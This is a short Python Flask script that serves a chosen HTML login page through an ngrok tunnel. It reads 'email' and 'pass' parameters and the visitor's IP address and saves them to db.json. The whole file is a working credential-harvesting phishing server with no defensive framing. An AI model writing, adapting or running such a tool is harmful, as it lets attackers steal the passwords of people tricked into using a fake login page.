#!/usr/bin/python

from flask import Flask ,request ,render_template
from flask_ngrok import run_with_ngrok
import threading, sys, json

app = Flask(__name__)
run_with_ngrok(app)
page = sys.argv[1]

@app.route('/' , methods=['POST','GET'])
def web_page():
    username = request.args.get('email')
    password = request.args.get('pass')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if request.args.get('email') and request.args.get('pass') != None:
        JS = {'username':username,'password':password,'ip':ip}
        JS = json.dumps(JS,indent='  ')
        with open('db.json','w') as f:
            f.write(JS)
    return render_template(page+'.html')

if sys.argv[2] == 'start':
    app.run()
